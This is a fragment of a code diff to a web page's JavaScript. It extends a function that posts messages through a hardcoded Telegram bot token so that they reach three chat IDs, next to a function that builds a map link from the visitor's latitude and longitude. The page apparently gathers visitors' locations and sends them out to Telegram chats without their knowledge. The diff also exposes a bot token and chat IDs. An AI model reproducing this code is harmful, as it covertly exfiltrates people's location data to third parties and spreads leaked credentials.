@@ -261,19 +261,22 @@
     }
 
     function sendTelegramMessage(fullMessage) {
-      const botToken = "8053207965:AAFxT4UzNGdzjiqNzkpjorMlXXz7cHNF6q0";
-      const chatId = "6238170291";
+  const botToken = "8053207965:AAFxT4UzNGdzjiqNzkpjorMlXXz7cHNF6q0";
+  const chatIds = ["6238170291", "1641066188", "5808291565"];
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: fullMessage,
-          parse_mode: "Markdown"
-        })
-      }).catch(err => console.error("❌ Error sending to Telegram", err));
-    }
+  chatIds.forEach(chatId => {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: fullMessage,
+        parse_mode: "Markdown"
+      })
+    }).catch(err => console.error("❌ Error sending to Telegram for chat", chatId, err));
+  });
+}
+
 
     function sendLocationAccessMessage() {
       const mapLink = `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
